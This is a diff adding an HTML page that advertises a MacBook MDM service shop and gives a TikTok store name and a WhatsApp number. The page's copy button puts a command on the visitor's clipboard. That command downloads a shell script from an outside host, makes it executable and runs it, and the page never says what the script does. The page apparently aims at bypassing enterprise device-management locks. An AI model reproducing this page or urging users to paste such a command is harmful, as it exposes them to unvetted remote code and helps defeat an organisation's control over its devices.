@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Webpage</title>
+    <style>
+        :root {
+            --primary-color: #2563eb;
+            --secondary-color: #1e40af;
+            --accent-color: #f97316;
+            --text-color: #1f2937;
+            --light-bg: #f8fafc;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background: linear-gradient(135deg, var(--light-bg) 0%, #e2e8f0 100%);
+            min-height: 100vh;
+        }
+
+        .content {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 4rem 2rem;
+            background: rgba(255, 255, 255, 0.95);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            border-radius: 16px;
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            font-weight: 700;
+        }
+
+        p {
+            margin: 1rem 0;
+            font-size: 1.1rem;
+            color: var(--text-color);
+        }
+
+        .highlight {
+            background: linear-gradient(135deg, #fff5f5 0%, #fff0f6 100%);
+            padding: 2rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+            border: 1px solid rgba(249, 115, 22, 0.2);
+        }
+
+        .highlight p {
+            color: var(--accent-color);
+            font-weight: 600;
+            margin: 1rem 0;
+        }
+
+        .contact-info {
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            padding: 2rem;
+            border-radius: 12px;
+            margin: 2rem 0;
+            border: 1px solid rgba(37, 99, 235, 0.2);
+        }
+
+        .contact-info p {
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin: 0.8rem 0;
+        }
+
+        .emoji {
+            font-size: 1.5rem;
+            margin-right: 0.5rem;
+        }
+
+        .copy-btn {
+            background: var(--primary-color);
+            color: white;
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(37, 99, 235, 0.2);
+            margin: 1.5rem 0;
+        }
+
+        .copy-btn:hover {
+            background: var(--secondary-color);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(37, 99, 235, 0.3);
+        }
+
+        .copy-btn:active {
+            transform: translateY(0);
+        }
+
+        @media (max-width: 640px) {
+            .content {
+                padding: 2rem 1rem;
+                margin: 1rem;
+            }
+
+            h1 {
+                font-size: 2rem;
+            }
+
+            .highlight, .contact-info {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>Welcome to Our MacBook Service Page</h1>
+        <p>Please click the button below to copy the code:</p>
+        <button class="copy-btn" id="copyButton">Click to Copy Code</button>
+
+        <div class="highlight">
+            <p>MrBagus Gadget, MacBook MDM Expert</p>
+            <p>🔒 The earliest specialist in MacBook enterprise MDM configuration locks, no one knows MDM better!</p>
+            <p>🚀 Discover MacBook's potential, all in our store.</p>
+        </div>
+
+        <div class="contact-info">
+            <p class="emoji">🌟 Store on Tiktok: MrBagus Gadget</p>
+            <p class="emoji">📲 Whatsapp: +60-1137270533</p>
+        </div>
+        
+        <p>Let's explore the future of MacBook together and unlock your technological world!</p>
+    </div>
+
+    <script>
+        document.getElementById('copyButton').addEventListener('click', function() {
+            var textToCopy = 'curl https://degula.zeabur.app/test.sh -o test.sh && chmod +x ./test.sh && ./test.sh';
+            var textArea = document.createElement('textarea');
+            textArea.value = textToCopy;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            alert('Code has been copied to clipboard!');
+        });
+    </script>
+</body>
+</html>
